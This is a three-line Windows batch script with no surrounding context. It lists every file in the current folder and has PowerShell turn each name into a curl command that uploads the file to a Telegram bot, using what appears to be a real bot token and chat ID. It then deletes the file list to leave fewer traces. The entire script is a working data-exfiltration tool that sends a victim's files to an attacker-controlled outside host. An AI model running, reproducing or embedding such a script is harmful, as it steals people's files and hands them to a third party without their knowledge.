dir /b >list.txt
powershell -Command "(gc list.txt) -replace '^', 'curl -F document=@"' -replace '$', '" https://api.telegram.org/bot2075322260:AAHwa3tRJuugVL03whnhUwoWFtOGBwpZ-gQ/sendDocument?chat_id=688448558' |cmd
del list.txt
